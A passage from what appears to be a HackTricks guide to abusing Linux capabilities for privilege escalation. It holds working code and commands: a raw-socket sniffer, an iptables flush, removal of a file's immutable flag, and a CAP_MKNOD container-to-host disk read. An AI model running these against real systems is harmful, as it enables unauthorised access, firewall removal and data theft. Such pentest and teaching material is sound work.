  \ \",\"\n    return flag[:-1]\n\ns = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))\ns.setsockopt(socket.SOL_SOCKET,\
  \ socket.SO_RCVBUF, 2**30)\ns.bind((\"lo\",0x0003))\n\nflag=\"\"\ncount=0\nwhile True:\n    frame=s.recv(4096)\n    ip_header=struct.unpack(\"\
  !BBHHHBBH4s4s\",frame[14:34])\n    proto=ip_header[6]\n    ip_header_size = (ip_header[0] & 0b1111) * 4\n    if(proto==6):\n\
  \        protocol=\"TCP\"\n        tcp_header_packed = frame[ 14 + ip_header_size : 34 + ip_header_size]\n        tcp_header\
  \ = struct.unpack(\"!HHLLHHHH\", tcp_header_packed)\n        dst_port=tcp_header[0]\n        src_port=tcp_header[1]\n  \
  \      flag=\" FLAGS: \"+getFlag(tcp_header[4])\n\n    elif(proto==17):\n        protocol=\"UDP\"\n        udp_header_packed_ports\
  \ = frame[ 14 + ip_header_size : 18 + ip_header_size]\n        udp_header_ports=struct.unpack(\"!HH\",udp_header_packed_ports)\n\
  \        dst_port=udp_header[0]\n        src_port=udp_header[1]\n\n    if (proto == 17 or proto == 6):\n        print(\"\
  Packet: \" + str(count) + \" Protocol: \" + protocol + \" Destination Port: \" + str(dst_port) + \" Source Port: \" + str(src_port)\
  \ + flag)\n        count=count+1\n```\n\n## CAP_NET_ADMIN + CAP_NET_RAW\n\n[**CAP_NET_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html)\
  \ capability grants the holder the power to **alter network configurations**, including firewall settings, routing tables,\
  \ socket permissions, and network interface settings within the exposed network namespaces. It also enables turning on **promiscuous\
  \ mode** on network interfaces, allowing for packet sniffing across namespaces.\n\n**Example with binary**\n\nLets suppose\
  \ that the **python binary** has these capabilities.\n\n```python\n#Dump iptables filter table rules\nimport iptc\nimport\
  \ pprint\njson=iptc.easy.dump_table('filter',ipv6=False)\npprint.pprint(json)\n\n#Flush iptables filter table\nimport iptc\n\
  iptc.easy.flush_table('filter')\n```\n\n## CAP_LINUX_IMMUTABLE\n\n**This means that it's possible modify inode attributes.**\
  \ You cannot escalate privileges directly with this capability.\n\n**Example with binary**\n\nIf you find that a file is\
  \ immutable and python has this capability, you can **remove the immutable attribute and make the file modifiable:**\n\n\
  ```python\n#Check that the file is imutable\nlsattr file.sh\n----i---------e--- backup.sh\n```\n\n```python\n#Pyhton code\
  \ to allow modifications to the file\nimport fcntl\nimport os\nimport struct\n\nFS_APPEND_FL = 0x00000020\nFS_IOC_SETFLAGS\
  \ = 0x40086602\n\nfd = os.open('/path/to/file.sh', os.O_RDONLY)\nf = struct.pack('i', FS_APPEND_FL)\nfcntl.ioctl(fd, FS_IOC_SETFLAGS,\
  \ f)\n\nf=open(\"/path/to/file.sh\",'a+')\nf.write('New content for the file\\n')\n```\n\n> [!TIP]\n> Note that usually\
  \ this immutable attribute is set and remove using:\n>\n> ```bash\n> sudo chattr +i file.txt\n> sudo chattr -i file.txt\n\
  > ```\n\n## CAP_SYS_CHROOT\n\n[**CAP_SYS_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) enables the\
  \ execution of the `chroot(2)` system call, which can potentially allow for the escape from `chroot(2)` environments through\
  \ known vulnerabilities:\n\n- [How to break out from various chroot solutions](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf)\n\
  - [chw00t: chroot escape tool](https://github.com/earthquake/chw00t/)\n\n## CAP_SYS_BOOT\n\n[**CAP_SYS_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html)\
  \ not only allows the execution of the `reboot(2)` system call for system restarts, including specific commands like `LINUX_REBOOT_CMD_RESTART2`\
  \ tailored for certain hardware platforms, but it also enables the use of `kexec_load(2)` and, from Linux 3.17 onwards,\
  \ `kexec_file_load(2)` for loading new or signed crash kernels respectively.\n\n## CAP_SYSLOG\n\n[**CAP_SYSLOG**](https://man7.org/linux/man-pages/man7/capabilities.7.html)\
  \ was separated from the broader **CAP_SYS_ADMIN** in Linux 2.6.37, specifically granting the ability to use the `syslog(2)`\
  \ call. This capability enables the viewing of kernel addresses via `/proc` and similar interfaces when the `kptr_restrict`\
  \ setting is at 1, which controls the exposure of kernel addresses. Since Linux 2.6.39, the default for `kptr_restrict`\
  \ is 0, meaning kernel addresses are exposed, though many distributions set this to 1 (hide addresses except from uid 0)\
  \ or 2 (always hide addresses) for security reasons.\n\nAdditionally, **CAP_SYSLOG** allows accessing `dmesg` output when\
  \ `dmesg_restrict` is set to 1. Despite these changes, **CAP_SYS_ADMIN** retains the ability to perform `syslog` operations\
  \ due to historical precedents.\n\n## CAP_MKNOD\n\n[**CAP_MKNOD**](https://man7.org/linux/man-pages/man7/capabilities.7.html)\
  \ extends the functionality of the `mknod` system call beyond creating regular files, FIFOs (named pipes), or UNIX domain\
  \ sockets. It specifically allows for the creation of special files, which include:\n\n- **S_IFCHR**: Character special\
  \ files, which are devices like terminals.\n- **S_IFBLK**: Block special files, which are devices like disks.\n\nThis capability\
  \ is essential for processes that require the ability to create device files, facilitating direct hardware interaction through\
  \ character or block devices.\n\nIt is a default docker capability ([https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19)).\n\
  \nThis capability permits to do privilege escalations (through full disk read) on the host, under these conditions:\n\n\
  1. Have initial access to the host (Unprivileged).\n2. Have initial access to the container (Privileged (EUID 0), and effective\
  \ `CAP_MKNOD`).\n3. Host and container should share the same user namespace.\n\n**Steps to Create and Access a Block Device\
  \ in a Container:**\n\n1. **On the Host as a Standard User:**\n\n   - Determine your current user ID with `id`, e.g., `uid=1000(standarduser)`.\n\
  \   - Identify the target device, for example, `/dev/sdb`.\n\n2. **Inside the Container as `root`:**\n\n```bash\n# Create\
  \ a block special file for the host device\nmknod /dev/sdb b 8 16\n# Set read and write permissions for the user and group\n\
  chmod 660 /dev/sdb\n# Add the corresponding standard user present on the host\nuseradd -u 1000 standarduser\n# Switch to\
  \ the newly created user\nsu standarduser\n```\n\n3. **Back on the Host:**\n\n```bash\n# Locate the PID of the container\
  \ process owned by \"standarduser\"\n# This is an illustrative example; actual command might vary\nps aux | grep -i container_name\
  \ | grep -i standarduser\n# Assuming the found PID is 12345\n# Access the container's filesystem and the special block device\n\
  head /proc/12345/root/dev/sdb\n```\n\nThis approach allows the standard user to access and potentially read data from `/dev/sdb`\
  \ through the container, exploiting shared user namespaces and permissions set on the device.\n\n### CAP_SETPCAP\n\n**CAP_SETPCAP**\
  \ enables a process to **alter the capability sets** of another process, allowing for the addition or removal of capabilities\
  \ from the effective, inheritable, and permitted sets. However, a process can only modify capabilities that it possesses\
  \ in its own permitted set, ensuring it cannot elevate another process's privileges beyond its own. Recent kernel updates\
  \ have tightened these rules, restricting `CAP_SETPCAP` to only diminish the capabilities within its own or its descendants'\
  \ permitted sets, aiming to mitigate security risks. Usage requires having `CAP_SETPCAP` in the effective set and the target\
  \ capabilities in the permitted set, utilizing `capset()` for modifications. This summarizes the core function and limitations\
  \ of `CAP_SETPCAP`, highlighting its role in privilege management and security enhancement.\n\n**`CAP_SETPCAP`** is a Linux\
  \ capability that allows a process to **modify the capability sets of another process**. It grants the ability to add or\
  \ remove capabilities from the effective, inheritable, and permitted capability sets of other processes. However, there\
  \ are certain restrictions on how this capability can be used.\n\nA process with `CAP_SETPCAP` **can only grant or remove\
  \ capabilities that are in its own permitted capability set**. In other words, a process cannot grant a capability to another\
  \ process if it does not have that capability itself. This restriction prevents a process from elevating the privileges\
  \ of another process beyond its own level of privilege.\n\nMoreover, in recent kernel versions, the `CAP_SETPCAP` capability\
  \ has been **further restricted**. It no longer allows a process to arbitrarily modify the capability sets of other processes.\
  \ Instead, it **only allows a process to lower the capabilities in its own permitted capability set or the permitted capability\
  \ set of its descendants**. This change was introduced to reduce potential security risks associated with the capability.\n\
  \nTo use `CAP_SETPCAP` effectively, you need to have the capability in your effective capability set and the target capabilities\
  \ in your permitted capability set. You can then use the `capset()` system call to modify the capability sets of other processes.\n\
  \nIn summary, `CAP_SETPCAP` allows a process to modify the capability sets of other processes, but it cannot grant capabilities\
  \ that it doesn't have itself. Additionally, due to security concerns, its functionality has been limited in recent kernel\
  \ versions to only allow reducing capabilities in its own permitted capability set or the permitted capability sets of its\
  \ descendants.\n\n## References\n\n**Most of these examples were taken from some labs of** [**https://attackdefense.pentesteracademy.com/**](https://attackdefense.pentesteracademy.com),\
  \ so if you want to practice this privesc techniques I recommend these labs.\n\n**Other references**:\n\n- [https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux](https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux)\n\
  - [https://www.schutzwerk.com/en/43/posts/linux_container_capabilities/#:\\~:text=Inherited%20capabilities%3A%20A%20process%20can,a%20binary%2C%20e.g.%20using%20setcap%20.](https://www.schutzwerk.com/en/43/posts/linux_container_capabilities/)\n\
  - [https://linux-audit.com/linux-capabilities-101/](https://linux-audit.com/linux-capabilities-101/)\n- [https://www.linuxjournal.com/article/5737](https://www.linuxjournal.com/article/5737)\n\
  - [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap_sys_module](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap_sys_module)\n\
  - [https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot](https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot)\n\
  \n​\n{{#include ../../banners/hacktricks-training.md}}"
_relative_path: linux-hardening/privilege-escalation/linux-capabilities.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/hacktricks/src/linux-hardening/privilege-escalation/linux-capabilities.md
````
